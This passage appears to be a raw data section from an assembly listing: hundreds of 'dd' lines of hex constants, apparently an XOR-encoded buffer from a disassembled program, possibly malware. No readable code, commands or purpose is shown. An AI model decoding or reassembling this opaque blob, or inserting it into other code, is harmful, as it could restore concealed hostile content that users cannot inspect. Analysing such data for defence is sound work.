		dd 9CBD40DDh, 40AF9974h, 0A245AEBCh, 0A1A249A1h, 0EFA740h
		dd 0A23FEC14h, 8C9B65BDh, 3FAF896Eh, 8E618DD9h,	9CA26386h
		dd 6E868F74h, 0A844AF9Ah, 879E24D0h, 74B08F61h,	89698E8Fh
		dd 0AFB9409Ch, 408B8973h, 0D93FB9BDh, 80916C8Eh, 6F9B9C63h
		dd 0BD44AF8Fh, 9CBD40DDh, 40AF9974h, 0BC45AEBCh, 0ADAD45AEh
		dd 0B5BD44h, 0A23FECB7h, 0AF8E6FAAh, 618DD93Fh,	0A263868Eh
		dd 868F749Ch, 44AF9A6Eh, 9E24D0A8h, 0B08F6187h,	698E8F74h
		dd 0B9409C89h, 8B8973AFh, 3FB9BD40h, 916C8ED9h,	9B9C6380h
		dd 44AF8F6Fh, 0BD40DDBDh, 0AF99749Ch, 45AEBC40h, 0A740A6A5h
		dd 0EC0F00EFh, 70BCA23Fh, 0BD748691h, 8E9F24D0h, 5F8C9473h
		dd 94729B8Eh, 0ABBD6781h, 63CBC255h, 0A2728E95h, 869C729Bh
		dd 44AF8E74h, 99749CBDh, 0D0AB40AFh, 6C839C24h,	89618C92h
		dd 0ABBD7280h, 40AFCF40h, 0BD649B8Eh, 0AABC41AFh, 0B5A558h
		dd 0A23FEBFBh, 819C72B7h, 649B8E40h, 0BC59AFBDh, 0EFA758B7h
		dd 6ED0FB61h, 0BD73808Dh, 8E9F24D0h, 5F8C9473h,	94729B8Eh
		dd 0ABBD6781h, 63CBC255h, 0A2728E95h, 869C729Bh, 44AF8E74h
		dd 99749CBDh, 0D0AB40AFh, 6C839C24h, 89618C92h,	0ABBD7280h
		dd 40AFCF40h, 0BD649B8Eh, 0ADB432AFh, 53A2FD00h, 0CB50ACABh
		dd 83992EDFh, 58FD6Ch, 98768E8Ah, 0AC8975A0h, 659C926Ch
		dd 0FDCBEFFDh, 8A8B6198h, 559B884Fh, 98729F93h,	8A8F619Fh
		dd 648E9848h, 0FD009D98h, 8E8A0029h, 75A09876h,	8E65BD89h
		dd 0EFFD748Ah, 6198FDA7h, 93498A8Bh, 9C926CACh,	5AFD65h
		dd 98768E8Ah, 81A86EA6h, 708A8F70h, 0B5659D9Ch,	8A99618Ah
		dd 5DFD72h, 98768E8Ah, 8AAF6EA6h, 9B9873h, 9C77EF49h, 81B46599h
		dd 70808953h, 0FDCCEFFDh, 8A8B6198h, 579B884Fh,	9874868Fh
		dd 0EF4E00EFh, 65999C77h, 895381B4h, 0EF89728Eh, 6198FDA6h
		dd 93498A8Bh, 0AD9964AEh, 65899B75h, 0FDB1EF8Fh, 8A8B6198h
		dd 72BF9349h, 8F619F98h, 8E98488Ah, 9D9864h, 9C77EF4Dh
		dd 81B46599h, 6E8A8D4Fh, 0FDADEFFDh, 8A8B6198h,	65A89349h
		dd 9075A189h, 9C8B65ABh, 2AFD00h, 98768E8Ah, 0BF8975A0h
		dd 619F9872h, 98488A8Fh, 9D98648Eh, 2CFD00h, 98768E8Ah
		dd 0A08975A0h, 819870h,	9C77EF40h, 9AB26599h, 748ABA74h
		dd 0B96D9AB3h, 0EF8E768Ah, 4DA1B457h, 9164C1B0h, 0EFD50083h
		dd 49AEAE57h, 91748C92h, 0EFBC00EFh, 53AEAE57h,	986B8C92h
		dd 0EFFD419Bh, 5FDDAE57h, 992EDDCEh, 0EFFD6C83h, 34ACBB4Dh
		dd 0B144C1CFh, 0EFF300A3h, 4D9B9847h, 91758B92h, 8394468Ah
		dd 6D8EB365h, 0BC78AA98h, 0EFF900EFh, 6D9A9345h, 9E6F9DADh
		dd 0A28E738Ah, 6C9A996Fh, 0FD009C98h, 0BFBC53BFh, 4CABD349h
		dd 0FD08EFB1h, 0A9AE54B8h, 4D8A9872h, 8F6F8298h, 0EFF10096h
		dd 51BCA957h, 84728A88h, 9C8E65BCh, 49819269h, 8F6F8993h
		dd 86896182h, 0AE936Fh,	0BC53BBAAh, 0DDCE49BFh,	6C83992Eh
		dd 0FCCBEFFDh, 9D8973B0h, 9D8D75h, 8E5FEE38h, 8693729Bh
		dd 9F9063h, 8E5FEE40h, 829E729Bh, 0EF9470h, 0FD00EFFDh
		dd 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh, 0BCC360ECh, 0EFFD00h
		dd 0FD012E7Fh, 0EFFD00EEh, 0EFFD01h, 0FD00EFFCh, 0EFFCC197h
		dd 0EE3C7Ch, 0FD012E7Dh, 0EFFD1DEFh, 0EE3C8Dh, 8868EFFDh
		dd 88936F95h, 6C83992Eh, 0FD69A9FDh, 0EFFD00EFh, 0EFFD00h
		dd 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh
		dd 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh
		dd 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h
		dd 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh
		dd 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh
		dd 0EFFD00EFh
		dd 0EFFD00h, 0ED00FA2Dh, 0FFFD16FFh, 10EF9180h,	0ED00833Dh
		dd 0FFFDCABFh, 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h
		dd 0FD00EFFDh, 0EFFD00EFh, 44ACBF41h, 0B547A9B8h, 0A3B64AA6h
		dd 50A0B34Dh, 0A953BDACh, 0B7AA56BAh, 628EA759h, 9B658B9Eh
		dd 85946888h, 6E82916Bh, 8F719F92h, 9988749Ch, 7A968577h
		dd 0CE32DECDh, 0D8CB35DBh, 2FC4C438h, 0FD00EFFDh, 0EFFD2DC2h
		dd 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h, 8748A283h
		dd 0EFFD00EFh, 44BDBC48h, 0B852AEAAh, 0BCB844B3h, 50A6AF43h
		dd 0B34FA6A9h, 9C8453B3h, 5C829874h, 896E8ABEh,	0BF91619Dh
		dd 658C9272h, 8F6F9C8Eh, 0EFFD30B3h, 749C9248h,	0FD00EFFDh
		dd 0BBAE59BCh, 43B3B045h, 98729D88h, 80BE7481h,	6F9D896Eh
		dd 8965BC91h, 9D9853B3h, 658C9476h, 8E25B38Eh, 0EFFD00EFh
		dd 75808F47h, 0FD00EF8Dh, 0BBAE59BCh, 47B3B045h, 8D75808Fh
		dd 808F47B3h, 0EF8D75h,	9C668AB9h, 0EF896C9Ah, 0DFD331h
		dd 8E6E868Ah, 0EFCD619Bh, 73CA8E25h, 94259CD8h,	0EFFD00EFh
		dd 73B38E25h, 8B688C92h, 8AD3749Ch, 0EF9878h, 91709798h
		dd 9D987280h, 6597982Eh, 0FD00EFFDh, 809A6F83h,	2E86886Eh
		dd 0FD659798h, 0B7A173CAh, 75C18B6Eh, 0FD00838Fh, 0B7A173CAh
		dd 75C1876Eh, 0FD00838Fh, 8C9273B3h, 749C8B68h,	98788AD3h
		dd 0EFFD00EFh, 6B9C9C74h, 916C8696h, 0CF9B2FCFh, 2082942Fh
		dd 9B61BCB6h, 8E8F548Ah, 788AD379h, 0FD00EF98h,	899C53A4h
		dd 619DA965h, 8565C184h, 0EFFD008Ah, 73CA8E25h,	0FD009CD8h
		dd 0EFFD70A6h, 0EFF938h, 0ED017561h, 0EFFD00EFh, 58AEAD2Eh
		dd 0FD00EFFDh, 0FFFC9A73h, 0EFFD00h, 0B941BFD3h, 0EFFD00EFh
		dd 208B9C62h, 926C83BCh, 8A89618Ch, 0EFFD00h, 0DD648E9Fh
		dd 899B758Dh, 0EF8F65h,	0D85C9CD8h, 0EFFD009Ch,	728C944Dh
		dd 9B6F9C92h, 8AB35C9Bh, 72808A74h, 9243B396h, 8C986E81h
		dd 6E809474h, 9F70B38Eh, 8E8F5C84h, 6F878D73h, 8D2E8A93h
		dd 0EFFD6B8Dh, 709FBC5Ch, 9C638691h, 8192699Bh,	748EB920h
		dd 944DB39Ch, 9C92728Ch, 5C9B9B6Fh, 8A748AB3h, 0B3967280h
		dd 6E819243h, 94748C98h, 0B38E6E80h, 5C849F70h,	8D738E8Fh
		dd 8A936F87h, 6B8D8D2Eh, 0FD00EFFDh, 9A9E6FABh,	7481986Dh
		dd 9361CF8Eh, 8AAE208Bh, 6E868974h, 0FD5C9C9Ah,	99936FACh
		dd 539B8F65h, 92548B94h, 868F74BCh, 69BC9A6Eh, 0FD00AE99h
		dd 8E8B648Eh, 32DC9470h, 916C8BD3h, 0EFFD00EFh,	52B0D94Ch
		dd 98449C9Ch, 83886189h, 659DBE74h, 896E8A99h, 9C916186h
		dd 0EFCD23h, 0B9738EAFh, 0BF916186h, 6D8E8F61h,	8E25CE8Eh
		dd 0EFFD30CCh, 69999844h, 0FD008A9Eh, 819268BFh, 6D9AB365h
		dd 0FD728A9Fh, 839C69ABh, 619D9C50h, 0B4559C90h, 0EFFD00ABh
		dd 53819457h, 0A1308E89h, 8E9B65ABh, 9B9175h, 0FD00EFDDh
		dd 0EFFD31CAh, 0DED822h, 8E5C9CD8h, 83916587h, 659F925Ch
		dd 9263B393h, 819C6D82h, 0EFFD64h, 0FD00C1D3h, 0EFFD00C1h
		dd 2AB38E25h, 0FD00C5D3h, 9CD873CAh, 0C5D32Ah, 0FD00EFA1h
		dd 0FFFCDBC3h, 10EE2624h, 0ED0134E1h, 0FFFCDBFBh, 10EE260Ch
		dd 0ED0134F9h, 0FFFCDA13h, 10EE27F4h, 0ED013511h, 0FFFCDA0Bh
		dd 10EE27DCh, 0ED013529h, 0FFFCDA23h, 10EE27C4h, 0ED01353Dh
		dd 0FFFCDA53h, 10EE27B8h, 0ED013549h, 0FFFCDA5Fh, 10EE27ACh
		dd 0ED013555h, 0FFFCDA4Bh, 10EE27A0h, 0ED013561h, 0FFFCDA77h
		dd 10EE2794h, 0ED01356Dh, 0FFFCDA67h, 10EE2784h, 0ED01357Dh
		dd 0FFFCDA93h, 10EE2778h, 0ED013589h, 0FFFCDA9Fh, 10EE276Ch
		dd 0ED013595h, 0FFFCDA8Bh, 10EE2760h, 0ED0135A1h, 0FFFCDAB7h
		dd 10EE2754h, 0ED0135ADh, 0FFFCDAA3h, 10EE2748h, 0ED0135B9h
		dd 0FFFCDAAFh, 10EE273Ch, 0ED0135C5h, 0FFFCDADBh, 10EE2730h
		dd 0ED0135D1h, 0FFFCDAC7h, 10EE2724h, 0ED0135DDh, 0FFFCDAF3h
		dd 10EE2718h, 0ED0135E9h, 0FFFCDAFFh, 10EE270Ch, 0ED013CB9h
		dd 0FFFCDAE7h, 10EE2E58h, 0ED0135FDh, 0FFFCD917h, 10EE24F0h
		dd 0ED013605h, 0FFFCD90Fh, 10EE24D0h, 0ED013639h, 0FFFCD953h
		dd 10EE24B0h, 0ED013659h, 0FFFCD973h, 10EE2490h, 0ED013675h
		dd 0FFFCD96Fh, 10EE2478h, 0ED01368Dh, 0FFFCD98Bh, 10EE2708h
		dd 0ED01369Dh, 0FFFCDA7Bh, 10EE245Ch, 0ED013565h, 0FFFCDA53h
		dd 10EE27B8h, 0ED013549h, 0FFFCDA5Fh, 10EE27ACh, 0ED013555h
		dd 0FFFCDA4Bh, 10EE27A0h, 0ED013561h, 0FFFCD3ABh, 10EE2450h
		dd 0ED0136B9h, 0FFFCD9D7h, 10EE2430h, 0ED0136D5h, 0FFFCD9CFh
		dd 10EE2410h, 0ED0134D1h, 0FFFCDBCBh, 10EE261Ch, 0ED0134E9h
		dd 0FFFCDBE3h, 10EE2604h, 0ED013501h, 0FFFCDA1Bh, 10EE27ECh
		dd 0ED013519h, 0FFFCDA33h, 10EE27D4h, 0ED013531h, 0FFFCDA2Bh
		dd 10EE240Ch, 0ED0136F5h, 0FFFCD9EBh, 10EE2400h, 0ED013701h
		dd 0FFFCD817h, 10EE25F4h, 0ED01370Dh, 0FFFCD98Fh, 10EE25ECh
		dd 0ED013715h, 0FFFCD80Bh, 10EE245Ch, 0ED013575h, 0FFFCD80Fh
		dd 10EE25DCh, 0ED013725h, 0FFFCD83Bh, 10EE25D0h, 0ED013731h
		dd 0FFFCD827h, 10EE25C4h, 0ED01373Dh, 0FFFCD853h, 10EE25B8h
		dd 0ED013749h, 0FFFCD85Fh, 10EE25ACh, 0ED013755h, 0FFFCD84Bh
		dd 10EE25A0h, 0ED013761h, 0FFFCD877h, 10EE2594h, 0ED01376Dh
		dd 0FFFCD863h, 10EE2588h, 0ED013779h, 0FFFCD86Fh, 10EE257Ch
		dd 0ED013785h, 0FFFCD89Bh, 10EE2570h, 0ED013791h, 0FFFCD887h
		dd 10EE2564h, 0ED01379Dh, 0FFFCD8B3h, 10EE2700h, 0ED013605h
		dd 0FFFCD91Fh, 10EE24F8h, 0ED01361Dh, 0FFFCD93Fh, 10EE24C4h
		dd 0ED013641h, 0FFFCD95Fh, 10EE24A4h, 0ED013661h, 0FFFCD97Fh
		dd 10EE2488h, 0ED0137A9h, 0FFFCD997h, 10EE2470h, 0ED013699h
		dd 0FFFCDAE7h, 10EE2460h, 0ED013569h, 0FFFCD9B3h, 10EE2798h
		dd 0ED013541h, 0FFFCDA57h, 10EE27B4h, 0ED01354Dh, 0FFFCDA43h
		dd 10EE27A8h, 0ED013559h, 0FFFCDA4Fh, 10EE279Ch, 0ED013CB9h
		dd 0FFFCD9BFh, 10EE2444h, 0ED0136C5h, 0FFFCD9DFh, 10EE2428h
		dd 0ED0136DDh, 0FFFCD9FFh, 0EFFD0Dh, 0FD00EFE6h, 0EFFD009Fh
		dd 0EFFD71h, 0FD00EF8Fh, 0EFFD009Ch, 0EFFD74h, 0FD00EF88h
		dd 0EFFD0099h, 0EFFD77h, 0FD00EF85h, 0EFFD0096h, 0EFFD7Ah
		dd 0FD00EF86h, 0EFFD002Fh, 0EFFD31h, 0FD00EFCFh, 0EFFD00DCh
		dd 0EFFD34h, 0FD00EFC8h, 0EFFD00D9h, 0EFFD37h, 0FD00EFC5h
		dd 0EFFD00D6h, 0EFFD30h, 0FD00EF40h, 0EFFD0054h, 0EFFD09h
		dd 0FD00EFACh, 0EFFD00B8h, 0EFFD45h, 0FD00EFAFh, 0EFFD00BBh
		dd 0EFFD59h, 0FD00EFA8h, 0EFFD00A6h, 0EFFD4Fh, 0FD00EFADh
		dd 0EFFD0034h, 0EFFDDDh, 0FD00EFBCh, 0EFFD00BCh, 0EFFD44h
		dd 0FD00EFBBh, 0EFFD00A8h, 0EFFD48h, 0FD00EFB7h, 0EFFD00A4h
		dd 0EFFD4Ch, 0FD00EF47h, 0EFFD0031h, 0EFFD5Ah, 0FD00EFA5h
		dd 0EFFD00ACh, 0EFFD56h, 0FD00EFBFh, 0EFFD00A1h, 0EFFD4Dh
		dd 0FD00EF41h, 0EFFD0051h, 0EFFDBFh, 0FD00EF21h, 0EFFD00FEh
		dd 0EFFD5Bh, 0FD00EFDDh, 0EFFD00B3h, 0EFFD2Ch, 0FD00EF6Ch
		dd 0EFFD00C2h, 0EFFD24h, 0FD00EFDCh, 0EFFD00C1h, 0EFFD23h
		dd 0FD00EFDFh, 0EFFD00CAh, 0EFFD26h, 0FD00EFDAh, 0EFFD00C7h
		dd 0EFFD90h, 0FD00EF92h, 0EFFD0085h, 0EFFD6Dh, 0FD00EF96h
		dd 0EFFD008Fh, 0EFFD61h, 0FD00EF9Fh, 0EFFD008Ch, 0EFFD64h
		dd 0FD00EF98h, 0EFFD0089h, 0EFFD67h, 0FD00EF95h, 0EFFD0086h
		dd 0EFFD6Eh, 0FD00EFD3h
		dd 0EFFD00C2h, 0EFFD08h, 0FD00EFF1h, 0EFFD00FDh, 0EFFD10h
		dd 0FD00EFEEh, 0EFFD00EEh, 2EDDC431h, 0D338D9CCh, 0EFCF2EDEh
		dd 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh
		dd 0EFFD00BFh, 0EFFD0Ah, 0FD00EFF8h, 0EFFD00EEh, 0EFFCF4h
		dd 0FD00EFADh, 0B28D55B4h, 0EFFD00h, 0FD004954h, 0EFFD00D0h
		dd 0EFFD3Eh, 0FD00EFC1h, 0EFFD00A2h, 0EFFD4Eh, 0FD00EFBFh
		dd 0EFFD00B9h, 0EFFD43h, 0FD00EFA5h, 0EFFD00B5h, 0EFFD22h
		dd 0FD00EFC7h, 0EFFD00A3h, 0EFFD4Bh, 0FD00EFB7h, 0EFFD00A7h
		dd 0EFFD47h, 0FD00EFBBh, 0EFFD00ABh, 0EFFD53h, 0FD00EFBCh
		dd 0EFFD0092h, 0EFFD7Bh, 0FD00EFADh, 0EFFD00A0h, 0EFFD49h
		dd 0FD00EFA8h, 0EFFD00B6h, 0EFFD54h, 0FD00EFAFh, 0EFFD00AAh
		dd 0EFFD57h, 0FD00EFACh, 0EFFD00B0h, 0EFFD29h, 0FD00EFD5h
		dd 0EFFD00C9h, 0EFFD5Eh, 0FD00EFD8h, 0EFFD00CBh, 0EFFD23h
		dd 0FD00EFBDh, 0EFFD00CEh, 0EFFD7Eh, 8861BFA6h,	0ADDD659Ch
		dd 6B8E9872h, 0FD00EFA0h, 869553B4h, 0B28966h, 896CAEA6h
		dd 0EFFD00B2h, 45A3BE5Bh, 0FD5DBDBCh, 0ACBC42B4h, 41BFAE4Bh
		dd 0FD5DAABEh, 0A3B844B4h, 5DAAA945h, 0FD00EFFDh, 0BCB349B4h
		dd 5DBBAF45h, 0FD00EFFDh, 0EFFD00C4h, 0EFFD2Ah,	9075A1A6h
		dd 8C924CCFh, 0EFA06Bh,	8A6FABA6h, 0EFFD5D81h, 6786AF5Bh
		dd 0FD5D9B95h, 0B2AD55B4h, 0EFFD00h, 9B65A3A6h,	0EFFD5D9Bh
		dd 678EAD5Bh, 8A6FAB98h, 0EFFD5D81h, 6481B85Bh,	0FD00EFA0h
		dd 839844B4h, 5D8A8965h, 0FD00EFFDh, 889C50B4h,	5D9FA865h
		dd 0FD00EFFDh, 829248B4h, 0EFA065h, 8E6EA6A6h, 0B289728Ah
		dd 0EFFD00h, 8F63BCA6h,	0CF916C80h, 6B8C924Ch, 0FD00EFA0h
		dd 868F50B4h, 53CF896Eh, 98659D9Eh, 0EFFD5D81h,	0B83A425Bh
		dd 0FD00B20Ch, 0A1B457B4h, 0EFFD5Dh, 0AF54ACA6h, 0EFFD5DA3h
		dd 0EFFD2Fh, 0FD00EFD1h, 0EFFD0082h, 0EFFD6Eh, 0FD00EF9Fh
		dd 0EFFD0099h, 0EFFD63h, 0FD00EF85h, 0EFFD0095h, 0EFFD27h
		dd 0FD00EFC6h, 0EFFD0083h, 0EFFD6Bh, 0FD00EF97h, 0EFFD0087h
		dd 0EFFD67h, 0FD00EF9Bh, 0EFFD008Bh, 0EFFD73h, 0FD00EF9Ch
		dd 0EFFD00B2h, 0EFFD5Bh, 0FD00EF8Dh, 0EFFD0080h, 0EFFD69h
		dd 0FD00EF88h, 0EFFD0096h, 0EFFD74h, 0FD00EF8Fh, 0EFFD008Ah
		dd 0EFFD77h, 0FD00EF8Ch, 0ADBC54B4h, 0EFFD5Dh, 0FD00EFC0h
		dd 0EFFD00C2h, 0EFFD30h, 0FD00EFC4h, 0EFFD00D7h, 0EFFD37h
		dd 0FD00EFCBh, 0EFFD00DAh, 0EFFD34h, 0FD00EFCEh, 0EFFD00DDh
		dd 0EFFD31h, 0FD00EF9Dh, 0DDCC46B4h, 0EFFD5Dh, 0CC31A9A6h
		dd 0EFFD00B2h, 30DEBB5Bh, 0FD00EFA0h, 0B2C446B4h, 0EFFD00h
		dd 0A038A9A6h, 0EFFD00EFh, 5DD8BB5Bh, 0FD00EFFDh, 0B2CB46B4h
		dd 0EFFD00h, 0A035A9A6h, 0EFFD00EFh, 5DDBBB5Bh,	0FD00EFFDh
		dd 0B2CE46B4h, 0EFFD00h, 0A032A9A6h, 0EFFD00EFh, 5DDEBB5Bh
		dd 0FD00EFFDh, 0ACAE45B4h, 0EFFD5Dh, 896EAAA6h,	0EFA0728Ah
		dd 798A962Eh, 0FD00EFFDh, 5EA60AE2h, 3A0D31EAh,	0F073CAA0h
		dd 5E375BE5h, 5DD519BCh, 0D82D8BD8h, 8BD82D8Bh,	64CADD20h
		dd 0C764CAC7h, 0E5F064CAh, 0EFFD00h, 896EAAC1h,	0E2C3728Ah
		dd 0EFFD0Ah, 9E61ADC1h,	8E8D5384h, 0D19863h, 35DA2BA6h
		dd 0EFA03A32h, 61898E61h, 98619C9Bh, 0EFFD00EFh, 6F9DAD5Ch
		dd 90619D9Ah, 839446CFh, 49B38E65h, 8F659B93h, 0CF896581h
		dd 6C9F8545h, 8F659D92h, 0B7B849B3h, 52A0B150h,	0A545C1B8h
		dd 0EFFD00AAh, 6C9F8D41h, 89618C94h, 9C936F86h,	788A945Ch
		dd 8F6F838Dh, 97982E8Ah, 689CA165h, 0A16C8398h,	81987080h
		dd 6D809E5Ch, 996E8E90h, 0EFFD00EFh, 749C8453h,	0FD008298h
		dd 9A9E65BCh, 799B9472h, 0FD00EFFDh, 838D70AEh,	748E9E69h
		dd 0FD6E8094h, 8AB965BCh, 50888862h, 9476868Fh,	8A9A6583h
		dd 0EFFD00h, 9E25CAD8h,	0CAD863CAh, 63CA9E25h, 0FD00EFFDh
		dd 0EFFD63CAh, 25C19925h, 9925C199h, 0EF9925C1h, 2EDDC431h
		dd 0D338D9CCh, 0DBCF2EDEh, 0EFFD34h, 8E748A8Eh,	80966380h
		dd 45CF8970h, 8F6F9D8Fh, 0EFFD0ACEh, 6C969B62h,	0FD00EFFDh
		dd 0CFA945A8h, 0EFFD00h, 0A954A7DDh, 0C1CC2FBFh, 0E5F031h
		dd 98638CBCh, 0CFC7749Fh, 678E9069h, 9467C098h,	86DD2C89h
		dd 65889C6Dh, 852D97D2h, 8289698Dh, 20C38D61h, 9A618294h
		dd 9F972F8Ah, 20C39A65h, 9A618294h, 858D2F8Ah, 2C889870h
		dd 8D708EDDh, 8E9E6983h, 6E809474h, 8E2D97D2h, 849E6F87h
		dd 65999C77h, 9C6C89D0h, 0CFD1689Ch, 6C9F8D61h,	89618C94h
		dd 0C0936F86h, 2E8B9376h, 982D9C90h, 83986397h,	708EDD2Ch
		dd 9E69838Dh, 8094748Eh, 6E99D26Eh, 8E6DC199h, 989270C2h
		dd 6F9F8F65h, 0D1748194h, 9F8D61CFh, 618C946Ch,	936F8689h
		dd 988E6DC0h, 2C8B8F6Fh, 0D72FC5DDh, 0EFFD0AE2h, 658C9E41h
		dd 0B12D9B8Dh, 9A9A6E8Eh, 3A8A9A61h, 0D06895DDh, 0E5F06E8Ch
		dd 0EFFD00h, 98638CBCh,	0AAD0749Fh, 64809E6Eh, 0C7678194h
		dd 868767CFh, 64CFD170h, 9C6C8998h, 0EFFD659Bh,	73BAF70Dh
		dd 0BC2D9D98h, 9B936588h, 7A80B03Ah, 9C6C8394h,	0DFD334C0h
		dd 6F8CD520h, 89619F90h, 8A916286h, 53A2DD3Bh, 0CB20AAB4h
		dd 0CFC630C1h, 64819457h, 0DD739892h, 0DADD54A1h, 20D4CC2Eh
		dd 0D431B9AEh, 0EFFD00EFh, 6FA7F70Dh, 0FD3A9B8Eh, 80BE0AE2h
		dd 638A936Eh, 936F8689h, 83BE20D5h, 8A8E6Fh, 0F70DE5F0h
		dd 0EFFD00EFh, 65899852h, 0C7728A8Fh, 9B8968CFh, 2FC0C770h
		dd 0FD00EFFDh, 0C0CD38D5h, 709B8968h, 0FD2FC0C7h, 80B50AE2h
		dd 20D58973h, 0FD00EFFDh, 8EBE0AE2h, 2D8A9563h,	896E80BEh
		dd 0D5916F9Dh, 2D809320h, 95638E9Eh, 0EFFD008Ah, 749C9248h
		dd 0FD00EFC7h, 0BBA948CFh, 2EDED250h, 0FD00EFCCh, 80BE0AE2h
		dd 638A936Eh, 936F8689h, 8AB620D5h, 41C28D65h, 98768691h
		dd 0EFFD00EFh, 0EFB64Fh, 9840E2F7h, 0EF896997h,	6C8A9940h
		dd 0FD00EFDDh, 0EFF00ACDh, 6C8A9940h, 0FD00CDDDh, 839864AFh
		dd 39DACE20h, 0C439D8CBh, 0DBC8318Eh, 398C9F33h, 8C61C19Bh
		dd 0EFF00A9Eh, 688C9840h, 9B6FCF92h, 0EFF00A89h, 398C9B61h
		dd 9B328A9Bh, 8DC531DBh, 308ECD30h, 89618DD3h, 0EFFD00EFh
		dd 5FA8B852h, 0BC4EA6BFh, 0EFFD59BDh, 34DDD025h, 0D025CF8Eh
		dd 0CF8E35DEh, 0EFF70Dh, 0A247AAAFh, 0BBB155A2h, 5ABCA249h
		dd 0FD00EFFDh, 0DBCF2DCAh, 2DCADD73h, 0DD73DACCh, 97D878DFh
		dd 298BD828h, 0FD0AE2DDh, 0B0BA45BDh, 52A0AA44h, 0FD00EFB9h
		dd 0DBCF2DCAh, 2DCADD73h, 0DD73DACCh, 0E2DD73CAh, 0EFFD0Ah
		dd 0A247AAAFh, 0AEAD58AAh, 53B0B94Eh, 0FD00EFA7h, 0B0BA45BDh
		dd 0EFA753h, 0A073CAA6h, 0EFFD0AE2h, 0EF9925h, 0B352AAB6h
		dd 0DDCE4CAAh, 6C83992Eh, 0FD00EFFDh, 0BC8965A8h, 749D9C74h
		dd 93499F88h, 0EFBC6F89h, 64829E5Ch, 98788AD3h,	0EFFD00EFh
		dd 68BC9853h, 92649B88h, 9DAD6E98h, 6C868B69h, 0FD658898h
		dd 839369B8h, 6E809A6Fh, 0FD00EFFDh, 86876FA2h,	2F8E916Ch
		dd 0DD30C1C9h, 829263C7h, 699B9C70h, 0D465839Fh, 0EFFD00EFh
		dd 6486AB43h, 9C438098h, 0EFFD009Fh, 37DDCE23h,	0FD00DFCAh
		dd 0C1CF2EDEh, 0EFFD35h, 92638194h, 8C98729Dh, 6583DD74h
		dd 95748893h, 8A9563CFh, 0EF9663h, 92638194h, 8C98729Dh
		dd 618BDD74h, 9E208E89h, 849E6587h, 0EFFD00h, 9C768194h
		dd 0CF996983h, 749C9464h
		dd 9863819Ch, 809274CFh, 728E9B20h, 9E618DDDh, 0EFFD0084h
		dd 61999369h, 0DD648691h, 9B8E698Bh, 658C9361h,	996F8CDDh
		dd 0EFFD008Ah, 61999369h, 0DD648691h, 8A896983h, 2F839C72h
		dd 9A6E8A91h, 8CDD689Bh, 8A996Fh, 9C768194h, 0CF996983h
		dd 749C9464h, 9863819Ch, 8A8E209Ch, 0EFFD74h, 9C768194h
		dd 0CF996983h, 659B946Ch, 0D26C8E8Fh, 88936583h, 209C9574h
		dd 0FD748A8Eh, 8E8B6E86h, 208B946Ch, 9864809Eh,	0CFD02DCFh
		dd 739C946Dh, 0DD678194h, 0C2996E8Ah, 62C29B6Fh, 96638091h
		dd 0EFFD00EFh, 61999369h, 0DD648691h, 0CF89698Dh, 6781986Ch
		dd 8F208789h, 8E98708Ah, 0EFFD74h, 0DD6F8089h, 96936182h
		dd 6E8A9120h, 0DD689B9Ah, 8BDD7280h, 619B8E69h,	0DD658C93h
		dd 8D90799Ch, 9C916Fh, 9C768194h, 0CF996983h, 658B9263h
		dd 936583DDh, 9C957488h, 748A8E20h, 0FD00EFFDh,	8E8B6E86h
		dd 208B946Ch, 8F6F9B8Eh, 8DDD648Ah, 6B8C926Ch, 936583DDh
		dd 9C957488h, 0EFFD00h,	9C768194h, 0CF996983h, 63809162h
		dd 8474CF96h, 0EFFD659Fh, 648E9868h, 9E209D98h,	82DD639Dh
		dd 61828E69h, 0FD688C89h, 81966E9Ah, 20818A6Fh,	99618A95h
		dd 89DD728Ah, 73889C6Ch, 89659CDDh, 0EFFD00EFh,	6F8C9369h
		dd 9E659D8Fh, 8A95209Bh, 728A9961h, 98688CDDh, 0EFFD6B8Ch
		dd 61999369h, 0DD648691h, 8B936998h, 73CF8A6Fh,	0FD659594h
		dd 81966E9Ah, 20818A6Fh, 8D6D809Eh, 9C8E659Dh, 20819269h
		dd 95748A90h, 0EFFD6480h, 6F8C9369h, 89619F90h,	8A916286h
		dd 728A8B20h, 936F868Eh, 0EFFD00EFh, 66898862h,	98209D98h
		dd 9D92729Dh, 0EFFD00h,	88738194h, 8C946689h, 74819869h
		dd 906582DDh, 0EF847280h, 619B9C64h, 8F728ADDh,	0EFFD7280h
		dd 659D8973h, 9820829Ch, 9D92729Dh, 0EFFD00h, 986C869Bh
		dd 9D8F65CFh, 0EF8F6Fh,	98729B8Eh, 8ADD6D8Eh, 0EF996Eh
		dd 99658A93h, 8C9464CFh, 6E809474h, 0FD799D9Ch,	0EFFD00EFh
		dd 10EE6CB4h, 0ED017F95h, 0EFFD01EEh, 0EFFC1Eh,	0FD00EFF2h
		dd 0EFFD00EFh, 10EE6B34h, 0ED017F21h, 0EFFD00EFh, 0EFFD1Eh
		dd 0FD00EFF2h, 0EFFD00EFh, 0EFFD00h, 0ED017EA9h, 0EFFD00EFh
		dd 0EFFD13h, 0FD00EFFAh, 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh
		dd 0FFFC9A73h, 0EFFD00h, 0AB41D0D3h, 8A8D799Bh,	6681945Fh
		dd 0FD40AF92h, 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh
		dd 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh
		dd 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h
		dd 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh
		dd 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh
		dd 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h
